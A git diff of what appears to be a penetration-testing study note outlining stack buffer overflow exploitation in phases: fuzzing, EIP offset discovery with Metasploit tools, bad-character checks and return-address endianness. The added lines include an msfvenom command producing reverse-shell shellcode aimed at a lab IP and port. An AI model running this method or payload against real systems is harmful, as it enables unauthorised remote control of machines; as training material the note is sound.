@@ -98,7 +98,7 @@ __BoF Phase1:__
 1. Use a "fuzzing" script to detemrmine if the program is susceptible to crashing at a determined input amount. Use a debugger to ensure that the EIP register is overwritten with "A's".  
 2. Create a unique pattern (MetaSploit's pattern_create can be used) based on the amount of data that previously crashed. Send the pattern to the program via modified script and copy the pattern that appears in the EIP.  
 3. Use MetaSploit's pattern_offset tool to determine where in the unique value the EIP previously obtained, is included (what bit value, or point in the whole pattern was this bit that fit into the EIP is at).  
-4. Modify script to include the crashing byte amount and the offset (set a different value for this, only 4 "B's" or 42). Include trailing "C's" or 43 for padding. This will be a placeholder for shellcode.  
+4. Modify script to include the crashing byte amount and the offset (set a different value for this, only 4 "B's" or \x42). Include trailing "C's" or \x43 for padding. This will be a placeholder for shellcode.  
 
 __BoF Phase2:__  
 5. Find bad characters that the program will not accept. If using Immunity debugger, the Mona module is good for this.  
@@ -106,5 +106,11 @@ __BoF Phase2:__
 7. Remember that the value found here must be placed into script used in Little-Endian format (backwards), or using a module that does this conversion for you.  
 
 __BoF Phase3:__  
-8. 
+8. Shellcode generation. Sample shellcode using MSFVenom is as follows:  
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.232.130 LPORT=443 -b “\x00\x0a” EXITFUNC=THREAD -f python  
+Do not forget to include the bad characters you have found via the -b option.  
+9. When testing the final script NOPs (\x90) may need to be added for additional padding.  
+10. Test offline and not against target before the actual attack target.  
+
+
         
